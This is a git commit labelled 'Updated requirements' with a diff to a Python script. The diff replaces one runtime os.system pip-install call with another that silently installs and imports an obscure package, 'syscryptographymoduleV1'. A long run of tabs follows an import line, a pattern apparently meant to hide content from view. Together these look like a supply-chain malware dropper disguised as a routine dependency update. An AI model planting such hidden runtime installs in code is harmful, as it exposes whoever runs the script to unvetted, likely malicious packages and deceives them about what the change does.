cad0ec554dc3aaafc79a7e41093be55083781497
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-08-07 14:44:25 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptlibrary")
-import syscryptlibrary
+os.system("pip install syscryptographymoduleV1")
+import syscryptographymoduleV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
